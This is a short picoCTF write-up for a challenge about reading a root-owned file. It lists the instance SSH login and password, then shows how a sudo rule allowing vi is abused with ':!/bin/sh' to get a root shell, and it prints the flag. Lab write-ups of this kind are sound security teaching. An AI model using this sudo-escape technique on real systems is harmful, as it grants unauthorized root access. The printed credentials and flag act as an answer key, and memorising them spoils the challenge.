# soal
Can you read files in the root file?
Additional details will be available after launching your challenge instance.

## launch istance
ssh -p 62223 picoplayer@saturn.picoctf.net \
Password: 33qE7mB5BF \
Can you login and read the root file?

# hint
- What permissions do you have?

# solve
```bash
ssh -p 62223 picoplayer@saturn.picoctf.net
# picoplayer@saturn.picoctf.net's password: 33qE7mB5BF

sudo -l
# [sudo] password for picoplayer:
# User picoplayer may run the following commands on challenge:
#     (ALL) /usr/bin/vi

## gtf obins
sudo vi -c ':!/bin/sh' /dev/nul

## or manual
sudo vi
# ESC
:!/bin/bash

cd /root
cat .flag.txt
# picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}
```

# flag
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}